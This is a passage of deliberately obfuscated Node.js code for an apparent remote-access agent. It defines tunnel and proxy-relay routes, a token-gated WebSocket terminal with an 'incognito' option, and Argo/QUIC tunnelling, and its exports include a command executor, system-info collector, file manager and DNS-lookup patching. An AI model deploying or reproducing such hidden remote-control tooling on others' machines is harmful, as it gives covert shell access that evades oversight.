                    'query': u[oE(0x9db)]['includes']('?') ? u[oE(0x9db)][oE(0x47b)](b[oE(0xd21)](u['url'][oE(0xe0a)]('?'), 0x1)) : '',
                    'headers': x,
                    'body': u['body'] || Buffer[oE(0x901)](0x0),
                    'maxBody': Math[oE(0x37f)](0x1, a0aE['KISAMA_HUB_MAX_BODY']),
                    'relayTimeout': b[oE(0xbc7)](Math[oE(0x37f)](0x5, a0aE['KISAMA_HUB_RELAY_TIMEOUT']), 0x3e8),
                    'forwardedFor': y || undefined
                });
                ({
                    status: z,
                    headers: A,
                    res: B
                } = await b[oE(0x187)](a0as, u[oE(0x174)], D[oE(0x9db)], D['headers'], u[oE(0x344)] || Buffer[oE(0x901)](0x0), b[oE(0xbc7)](Math[oE(0x37f)](0x5, a0aE[oE(0xa99)]), 0x3e8)));
            } catch (E) {
                const F = E && E[oE(0x223)] ? E[oE(0x223)] : b[oE(0xf83)], G = b[oE(0xeb2)](F, b[oE(0x4b6)]) ? 0x193 : b[oE(0x3f7)](F, b[oE(0x4ec)]) ? 0x19d : 0x1f6;
                return v[oE(0x13d)](G)[oE(0xb56)]({
                    'status': b['JXrue'],
                    'code': F,
                    'message': b['yDoLL'](String, E && E['message'] || E)['slice'](0x0, 0x12c)
                });
            }
            v[oE(0x13d)](z)[oE(0x42d)](b[oE(0x6f3)](a0aq, A))['flushHeaders'](), B['on'](b['JXrue'], () => {
                const oF = oE;
                if (!v[oF(0x4dd)])
                    v[oF(0x28a)]();
            }), B[oE(0x445)](v);
        };
        g['ws'](b['chAse'], a0an), g['ws'](b[nV(0xf56)], a0an), g[nV(0x84e)](b[nV(0xf56)], o), g[nV(0x84e)](b['chAse'], o), g['ws'](b['COORV'], a0an), g['ws'](b[nV(0x5bd)], a0an), g[nV(0xb12)](nV(0xa40), (u, v) => {
            const oG = nV, w = j[oG(0x932)]();
            v[oG(0xb56)]({
                'status': 'ok',
                'count': w['length'],
                'tunnels': w
            });
        }), g[nV(0x257)](b[nV(0xece)], async (u, v) => {
            const oH = nV;
            try {
                const w = b['cglSC'](a0cN, u['body']);
                let x = w['port'];
                (x === undefined || x === null || b[oH(0x1c4)](x, '')) && (x = a0aE[oH(0x563)]);
                const y = Number(x);
                if (!Number['isInteger'](y) || y < 0x1 || y > 0xffff)
                    return v['status'](0x1a6)[oH(0xb56)]({
                        'status': b[oH(0xbd8)],
                        'created': ![],
                        'port': x,
                        'message': b[oH(0x8a4)]
                    });
                const z = await j['create'](y, b[oH(0xc05)](w['duplicate'], !![]), w[oH(0x562)] === !![] || b[oH(0xbd3)](w[oH(0x562)], 0x1) || b[oH(0x4be)](b[oH(0xf5f)](String, w['quic'])['toLowerCase'](), b[oH(0x531)]), {
                    'source': b[oH(0xd79)],
                    'shz': b[oH(0xd74)](w[oH(0xb59)], !![]) || w[oH(0xb59)] === 0x1 || b['zozOF'](b[oH(0x6f3)](String, w[oH(0xb59)])[oH(0x544)](), b[oH(0x531)]),
                    'shzName': b[oH(0x1040)](w[oH(0xbb1)], undefined) || b[oH(0x4be)](w[oH(0xbb1)], null) || b[oH(0x46e)](w[oH(0xbb1)], '') ? null : w[oH(0xbb1)],
                    'shzKey': b[oH(0xc05)](w[oH(0x178)], undefined) || b['btHIO'](w[oH(0x178)], null) || w[oH(0x178)] === '' ? null : w[oH(0x178)]
                });
                v['json']({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': z[oH(0x140)],
                    'port': z[oH(0x5c6)],
                    'created_at': z['createdAt'],
                    'transport': z['transport'],
                    'tunnel_status': z[oH(0x13d)] || b[oH(0x2ae)],
                    'last_error': z[oH(0xef5)] ?? null,
                    'last_error_at': z[oH(0x316)] ?? null,
                    'consecutive_failures': z[oH(0x670)] || 0x0,
                    'shz_name': z[oH(0x4ff)] ?? null,
                    'shz_url': z[oH(0x4ff)] ? b[oH(0xd21)](oH(0xf6c), z['shzName']) : null
                });
            } catch (A) {
                v[oH(0x13d)](A[oH(0x13d)] || 0x1f4)[oH(0xb56)]({
                    'status': b[oH(0xbd8)],
                    'created': ![],
                    'port': A[oH(0x5c6)] ?? null,
                    'message': A[oH(0x769)]
                });
            }
        }), g[nV(0x350)](b[nV(0xece)], async (u, v) => {
            const oI = nV;
            try {
                const w = a0cN(u[oI(0x344)]), x = w[oI(0x5c6)], y = b['EwdjO'](Number, x);
                if (b[oI(0xd05)](x, undefined) || b[oI(0x894)](x, null) || b[oI(0x1c4)](x, '') || !Number[oI(0x63f)](y) || b[oI(0x8b4)](y, 0x1) || y > 0xffff)
                    return v[oI(0x13d)](0x1a6)['json']({
                        'status': oI(0xfcc),
                        'deleted': 0x0,
                        'port': x ?? null,
                        'message': b[oI(0x97f)]
                    });
                const z = await j[oI(0x51e)](y, w[oI(0xeae)]);
                if (b[oI(0xa7c)](z['status'], 'ok'))
                    return v[oI(0xb56)]({
                        'status': 'ok',
                        'deleted': z['deleted'],
                        'port': y,
                        'tunnels': z[oI(0x326)]
                    });
                return v[oI(0x13d)](z[oI(0x13d)])[oI(0xb56)]({
                    'status': b['JXrue'],
                    'deleted': 0x0,
                    'port': y,
                    'message': z[oI(0x769)]
                });
            } catch (A) {
                v['status'](0x1f4)['json']({
                    'status': b[oI(0xbd8)],
                    'deleted': 0x0,
                    'message': A[oI(0x769)]
                });
            }
        }), g[nV(0x257)](b[nV(0xc55)], async (u, v) => {
            const oJ = nV;
            try {
                const w = b[oJ(0xe56)](a0cN, u[oJ(0x344)]), x = w[oJ(0x5c6)], y = Number(x);
                if (b[oJ(0xc67)](x, undefined) || b[oJ(0xc7a)](x, null) || b[oJ(0x40a)](x, '') || !Number[oJ(0x63f)](y) || b[oJ(0x25f)](y, 0x1) || b[oJ(0xd80)](y, 0xffff))
                    return v['status'](0x1a6)[oJ(0xb56)]({
                        'status': b[oJ(0xbd8)],
                        'bound': ![],
                        'port': b[oJ(0x6bd)](x, null),
                        'message': b[oJ(0x97f)]
                    });
                const z = await j['bind'](y, w['tunnel_domain'] === undefined || b[oJ(0x7cc)](w[oJ(0xeae)], null) || b[oJ(0xc91)](w[oJ(0xeae)], '') ? null : w['tunnel_domain'], b[oJ(0x8ce)](w[oJ(0xbb1)], undefined) || w['shz_name'] === null || b[oJ(0xd74)](w['shz_name'], '') ? null : w[oJ(0xbb1)], b[oJ(0xd94)](w[oJ(0x178)], undefined) || b['ZKJac'](w[oJ(0x178)], null) || b['VTAjA'](w['shz_key'], '') ? null : w[oJ(0x178)]);
                if (z[oJ(0x13d)] === 'ok')
                    return v[oJ(0xb56)](z);
                return v[oJ(0x13d)](z[oJ(0x13d)])[oJ(0xb56)]({
                    'status': b[oJ(0xbd8)],
                    'bound': ![],
                    'port': y,
                    'message': z['message']
                });
            } catch (A) {
                v[oJ(0x13d)](0x1f4)[oJ(0xb56)]({
                    'status': b[oJ(0xbd8)],
                    'bound': ![],
                    'message': A['message']
                });
            }
        }), g['delete'](b[nV(0xc55)], async (u, v) => {
            const oK = nV;
            try {
                const w = b[oK(0xa81)](a0cN, u['body']), x = w[oK(0x5c6)], y = Number(x);
                if (x === undefined || b[oK(0xb75)](x, null) || b[oK(0x894)](x, '') || !Number['isInteger'](y) || y < 0x1 || y > 0xffff)
                    return v[oK(0x13d)](0x1a6)[oK(0xb56)]({
                        'status': b[oK(0xbd8)],
                        'bound': ![],
                        'port': b[oK(0x6bd)](x, null),
                        'message': b[oK(0x97f)]
                    });
                const z = await j[oK(0xe8a)](y, w[oK(0xeae)] === undefined || b[oK(0x5cf)](w[oK(0xeae)], null) || b['cjJLI'](w['tunnel_domain'], '') ? null : w[oK(0xeae)]);
                if (b[oK(0xba7)](z['status'], 'ok'))
                    return v[oK(0xb56)](z);
                return v[oK(0x13d)](z[oK(0x13d)])[oK(0xb56)]({
                    'status': b[oK(0xbd8)],
                    'bound': ![],
                    'port': y,
                    'message': z[oK(0x769)]
                });
            } catch (A) {
                v['status'](0x1f4)[oK(0xb56)]({
                    'status': b[oK(0xbd8)],
                    'bound': ![],
                    'message': A[oK(0x769)]
                });
            }
        }), a0R['debug'](b[nV(0xec1)]), g['ws'](b['InaaO'], async (u, v) => {
            const oL = nV, w = v['params'][0x0];
            a0R[oL(0xac2)](oL(0x489)['concat'](v[oL(0x9db)])), a0R[oL(0xac2)](oL(0x371)[oL(0x83f)](w));
            const x = v['query']['request_id'], y = v[oL(0x842)][oL(0xf1d)], z = v[oL(0x842)][oL(0x40e)] === '1', A = v['query']['incognito'] === '1';
            a0R[oL(0xac2)](oL(0xaa2)[oL(0x83f)](x));
            if (!x) {
                a0R['debug'](b['Pougb']), u[oL(0x76b)](0x3f0, b['llDYr']);
                return;
            }
            if (y) {
                const C = a0aE['wsDowngradeToken'](), D = Buffer[oL(0xca5)](b[oL(0xa81)](String, y), oL(0x368)), E = Buffer[oL(0xca5)](C, b[oL(0xa19)]), F = b[oL(0x540)](D[oL(0xc54)], E[oL(0xc54)]) && a0k[oL(0xa96)](D, E);
                if (!F) {
                    a0R[oL(0x585)](oL(0xaf0)[oL(0x83f)](x, oL(0x6f1))), u['close'](0x3f0, b[oL(0x7a1)]);
                    return;
                }
            }
            const B = new a0d3();
            await B[oL(0x8e5)](u, x, y, z, A);
        }), a0R[nV(0xac2)]('WebSocket\x20route\x20configured'), a0aX[nV(0x7f8)]();
        const p = a0aW[nV(0x103d)]();
        if (p['hub'][nV(0xc54)] || p[nV(0x95a)][nV(0xc54)]) {
            if (p['hub'][nV(0xc54)])
                a0al(a0ad, p['hub']);
            if (p[nV(0x95a)][nV(0xc54)])
                b[nV(0x385)](a0al, a0ae, p[nV(0x95a)]);
            a0R[nV(0x543)](nV(0x9f0)[nV(0x83f)](p[nV(0x73d)][nV(0xc54)], '\x20个,\x20本地组\x20')[nV(0x83f)](p[nV(0x95a)][nV(0xc54)], '\x20个'));
        }
        for (const u of a0aW['getHubregs']()) {
            l[nV(0xb66)](u);
        }
        a0R[nV(0xac2)](b['FkrWw']);
        const q = g[nV(0x86b)](a0aE[nV(0x563)], a0aE['HOST'], () => {
            const oN = nV, v = {
                    'xrSuI': function (w, z) {
                        const oM = a0b;
                        return b[oM(0x566)](w, z);
                    }
                };
            a0R[oN(0xac2)](oN(0x614)[oN(0x83f)](a0aE[oN(0x4a2)], '\x20started\x20on\x20')[oN(0x83f)](a0aE[oN(0x76d)], ':')['concat'](a0aE['PORT'])), a0R[oN(0xac2)](b[oN(0xc75)]);
            (b[oN(0xa29)](a0aE[oN(0x17d)], '1') || b[oN(0xc21)](a0aE[oN(0x17d)], '2') && a0cT[oN(0x3a8)]()) && a0cT['activate'](j);
            for (const w of a0aW['getArgobinds']()) {
                j[oN(0xefe)](w['port'], ![], ![], { 'source': b[oN(0xc86)] })[oN(0xdcb)](() => j['bind'](w[oN(0x5c6)], null, w[oN(0x94b)], w[oN(0x525)] ?? null))[oN(0xdcb)](x => {
                    const oO = oN;
                    x && v[oO(0xbd7)](x[oO(0x13d)], 'ok') ? a0R[oO(0x543)](oO(0x1a6)['concat'](w[oO(0x94b)], '\x20(port\x20')[oO(0x83f)](w[oO(0x5c6)], ')')) : a0R['warn'](oO(0x5f9)[oO(0x83f)](w[oO(0x94b)], oO(0x1e3))[oO(0x83f)](w[oO(0x5c6)], oO(0xb3a))['concat'](x && x[oO(0x769)], oO(0x973)));
                })[oN(0x92f)](x => a0R[oN(0x585)](oN(0x5f9)['concat'](w['name'], '\x20(port\x20')[oN(0x83f)](w[oN(0x5c6)], oN(0xb3a))[oN(0x83f)](x[oN(0x769)], oN(0x973))));
            }
            a0aE[oN(0x17d)] === '3' && m && m['start']();
            for (const x of l) {
                const y = b[oN(0x8b3)](String, x[oN(0xebe)] || '')[oN(0x5b0)]()[oN(0x544)]();
                if (k[oN(0xb12)](y)) {
                    a0R[oN(0x585)](oN(0xfc6)['concat'](y, oN(0xe13)));
                    continue;
                }
                const z = new a0cQ(x[oN(0x73d)], x[oN(0xebe)], a0aE[oN(0x563)], x[oN(0xfea)], i, b[oN(0x6ff)]);
                k['items']['set'](y, z), z[oN(0x373)](), a0R['info'](oN(0xa3b)['concat'](y, '\x20→\x20')[oN(0x83f)](x['hub']));
            }
            process['platform'] === oN(0x6a3) && b[oN(0xa6e)](typeof Bun, b['OZrtI']) && b[oN(0xe92)](a0Q)['catch'](() => {
            });
        });
        process['on'](b[nV(0x5e2)], () => {
            const oP = nV;
            a0R[oP(0xac2)](b[oP(0x7d6)]), q[oP(0x76b)](), process['exit'](0x0);
        }), a0R['debug'](nV(0x947));
    } catch (v) {
        a0R[nV(0xfcc)](b[nV(0x6b5)], v), process[nV(0x1ce)](0x1);
    }
}
(require['main'] === module || require[a0d9(0xa24)]?.['filename']?.[a0d9(0x152)](a0d9(0xbf7))) && a0d5()[a0d9(0x92f)](a0R[a0d9(0xfcc)]);
module[a0d9(0xafe)] = {
    'main': a0d5,
    'loadCurves': a0d4,
    'Config': a0aE,
    'CryptoManager': a0aM,
    'SystemInfoCollector': a0aP,
    'CommandExecutor': a0aQ,
    'FileManager': a0aV,
    'fileErrorReason': a0aT,
    'TaskManager': a0aX,
    'TaskStore': a0aW,
    'ArgoTunnelManager': a0cO,
    'argoBackoffSeconds': a0cJ,
    'argoTruncateError': a0cK,
    'argoRetryBaseSeconds': a0cH,
    'argoRetryMaxSeconds': a0cI,
    'argoReregisterAfter': a0cF,
    'argoBindName': a0cV,
    'argoBindKey': a0cW,
    'argoBindError': a0cX,
    'KModeController': a0cT,
    'HubTunnelManager': a0cQ,
    'HubWSStream': a0cR,
    'HubRegisterError': a0aD,
    'HubTunnelRegistrar': a0cS,
    'hubKnameError': a0a7,
    'hubPublicUrlError': a0a9,
    'isShzalHubAlias': a0av,
    'shzalHubAliasError': a0ax,
    'validateResolvedHubUrl': a0ay,
    'resolveShzalHubUrl': a0aA,
    'deriveHubWsUrl': a0aa,
    'filterLoopbackHeaders': a0ab,
    'hubBackoffSeconds': a0aB,
    'parseHubPorts': a0a6,
    'PROXY_STRIPPED_AUTH_HEADERS': a0ac,
    'makeRelayError': a0ao,
    'httpRequestRaw': a0ap,
    'httpRequestStream': a0as,
    'relayLoopbackPrepare': a0ar,
    'filterProxyResponseHeaders': a0aq,
    'relayLoopbackHttp': a0at,
    'proxyRuntimePorts': a0ah,
    'proxyEffectivePorts': a0aj,
    'proxySetRuntimePorts': a0al,
    'proxyMergeRuntimePorts': a0am,
    'proxyGroupsSnapshot': a0ai,
    'cleanPortList': a0ak,
    'PROXY_GROUP_HUB': a0ad,
    'PROXY_GROUP_LOCAL': a0ae,
    'PROXY_RUNTIME_PORTS': a0af,
    'proxyWsRelayHandler': a0an,
    'ZipArchiver': a0aS,
    'TempKeyManager': a0aL,
    'SecureDns': a0aH,
    'installDnsHook': a0aK,
    'patchDnsLookup': a0aJ,
    'QuicConnection': a0cw,
    'QuicSession': a0cB,
    'QuicTlsClient': a0ct,
    'QuicKeys': a0cd,
    'QuicReader': a0c9,
    'quicInitialKeys': a0cf,
    'quicNextKeys': a0ce,
    'quicWriteVarint': a0c6,
    'quicReadVarint': a0c7,
    'quicDecodePacketNumber': a0cm,
    'quicApplyProtection': a0ck,
    'quicRemoveProtection': a0cl,
    'quicEncodeTransportParameters': a0cq,
    'quicDecodeTransportParameters': a0cp,
    'quicEncodeAck': a0cn,
    'quicRangesFromAck': a0co,
    'hkdfExpandLabel': a0cc,
    'CapnpBuilder': a0bg,
    'capnpMessages': a0bj,
    'capnpWords': a0bl,
    'capnpStruct': a0bk,
    'capnpText': a0bn,
    'capnpStructList': a0bm,
    'capnpReturnResult': a0bo,
    'capnpConnectRequest': a0bp,
    'capnpConnectResponse': a0bq,
    'connectEdgeQuic': a0cC,
    'buildQuicRequest': a0cy,
    'verifyEdgeQuicCertificate': a0cu,
    'QUIC_DATA_STREAM_PREAMBLE': a0bJ,
    'QUIC_SERVER_NAME': a0bS,
    'QUIC_ALPN': a0bR,
    '__ptySelector': {
        'detectLinuxLibc': a0I,
        'ptyCandidateOrder': a0J,
        'probePtyModule': a0L,
        'ensurePty': a0Q,
        'PTY_QWQO_VERSION': a0G,
        'PTY_CLOSE_REASON': a0H,
        'qwqoPlatformBinaryPath': a0O,
        'selectPtyImplementation': a0P,
        'getState': () => ({
            'ready': !!a0C,
            'reason': a0D
        })
    }
};